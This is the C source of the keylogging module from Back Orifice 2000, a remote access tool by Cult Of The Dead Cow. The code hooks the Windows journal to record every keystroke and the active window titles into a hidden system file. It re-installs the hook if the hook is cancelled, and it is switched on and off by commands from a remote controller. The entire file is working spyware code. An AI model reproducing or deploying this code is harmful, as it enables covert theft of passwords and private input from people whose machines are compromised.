/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<osversion.h>
#include<functions.h>
#include<auth.h>
#include<iohandler.h>
#include<encryption.h>
#include<commandloop.h>
#include<bocomreg.h>
#include<dumppw.h>
#include<cmd\cmd_keylogging.h>
#include<bo_debug.h>
#include<main.h>

BOOL g_bLogging=FALSE;
HANDLE g_hCapFile=NULL;
DWORD g_dwKeyCapTID=0;
HANDLE g_hKeyCapThread=NULL;
HHOOK g_hLogHook=NULL;
HWND g_hLastFocus=NULL;

LRESULT CALLBACK JournalLogProc(int code, WPARAM wParam, LPARAM lParam)
{
	if(code<0) return CallNextHookEx(g_hLogHook,code,wParam,lParam);

	if(code==HC_ACTION) {
		EVENTMSG *pEvt=(EVENTMSG *)lParam;
		if(pEvt->message==WM_KEYDOWN) {
			DWORD dwCount,dwBytes;
			char svBuffer[256];
			int vKey,nScan;
		
			vKey=LOBYTE(pEvt->paramL);
			nScan=HIBYTE(pEvt->paramL);
			nScan<<=16;
			
			// Check to see if focus has changed
			HWND hFocus=GetActiveWindow();
			if(g_hLastFocus!=hFocus) {
				char svTitle[256];
				int nCount;
				nCount=GetWindowText(hFocus,svTitle,256);
				if(nCount>0) {
					char svBuffer[512];
					wsprintf(svBuffer,"\r\n-----[ %s ]-----\r\n",svTitle);
					WriteFile(g_hCapFile,svBuffer,lstrlen(svBuffer),&dwBytes,NULL);
				}
				g_hLastFocus=hFocus;
			}
			
			// Write out key
			dwCount=GetKeyNameText(nScan,svBuffer,256);	
			if(dwCount) {
				if(vKey==VK_SPACE) {
					svBuffer[0]=' ';
					svBuffer[1]='\0';
					dwCount=1;
				}
				if(dwCount==1) {
					BYTE kbuf[256];
					WORD ch;
					int chcount;
					
					GetKeyboardState(kbuf);
					
					chcount=ToAscii(vKey,nScan,kbuf,&ch,0);
					if(chcount>0) WriteFile(g_hCapFile,&ch,chcount,&dwBytes,NULL);				
				} else {
					WriteFile(g_hCapFile,"[",1,&dwBytes,NULL);
					WriteFile(g_hCapFile,svBuffer,dwCount,&dwBytes,NULL);
					WriteFile(g_hCapFile,"]",1,&dwBytes,NULL);
					if(vKey==VK_RETURN) WriteFile(g_hCapFile,"\r\n",2,&dwBytes,NULL);
				}
			}			
		}
	
	}
	return CallNextHookEx(g_hLogHook,code,wParam,lParam);
}


DWORD WINAPI KeyCapThread(LPVOID param)
{
	MSG msg;
	BYTE keytbl[256];
	int i;
	for(i=0;i<256;i++) keytbl[i]=0;
					
	g_bLogging=TRUE;
	g_hLastFocus=NULL;

	g_hCapFile=CreateFile((char *)param,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,NULL);
	if(g_hCapFile==INVALID_HANDLE_VALUE) {
		return -1;
	}
	SetFilePointer(g_hCapFile,0,NULL,FILE_END);

	g_hLogHook=SetWindowsHookEx(WH_JOURNALRECORD,JournalLogProc,g_module,0);
	if(g_hLogHook==NULL) {
		CloseHandle(g_hCapFile);
		g_hCapFile=NULL;
		return -1;
	}

	g_bLogging=TRUE;

	while(g_bLogging) {
		while(PeekMessage(&msg,NULL,0,0,PM_NOREMOVE)) {
			GetMessage(&msg,NULL,0,0);
			if(msg.message==WM_CANCELJOURNAL) {
				
				SetKeyboardState(keytbl);
				g_hLogHook=SetWindowsHookEx(WH_JOURNALRECORD,JournalLogProc,g_module,0);
				
				if(g_hLogHook==NULL) {
					CloseHandle(g_hCapFile);
					g_hCapFile=NULL;
					return -1;
				}
			} else {
				DispatchMessage(&msg);
			}
		}
		Sleep(0);
	}

	UnhookWindowsHookEx(g_hLogHook);
	
	CloseHandle(g_hCapFile);
	g_hCapFile=NULL;
	g_hKeyCapThread=NULL;


	return 0;
}

int CmdProc_SysLogKeys(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	if(g_bLogging==TRUE) {
		IssueAuthCommandReply(cas_from, comid, 0, "Logging is already turned on.\n");
		return -1;
	}
	
	g_hKeyCapThread=CreateThread(NULL,0,KeyCapThread,(LPVOID)svArg2,0,&g_dwKeyCapTID);
	if(g_hKeyCapThread==NULL) {
		IssueAuthCommandReply(cas_from, comid, 0, "Error creating capture thread.\n");
		return -1;
	}

	IssueAuthCommandReply(cas_from, comid, 0, "Key logging started.\n");
	return 0;
}

int CmdProc_SysEndKeyLog(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	if(g_bLogging==FALSE) {
		IssueAuthCommandReply(cas_from, comid, 0, "Logging is not turned on.\n");
		return 0;
	}

	g_bLogging=FALSE;
	if(WaitForSingleObject(g_hKeyCapThread,5000)!=WAIT_OBJECT_0) {
		IssueAuthCommandReply(cas_from,comid,0,"Logging couldn't stop in 5 sec.\n");
		return -1;
	}

	IssueAuthCommandReply(cas_from,comid,0,"Logging stopped successfully.\n");
	return 0;
}
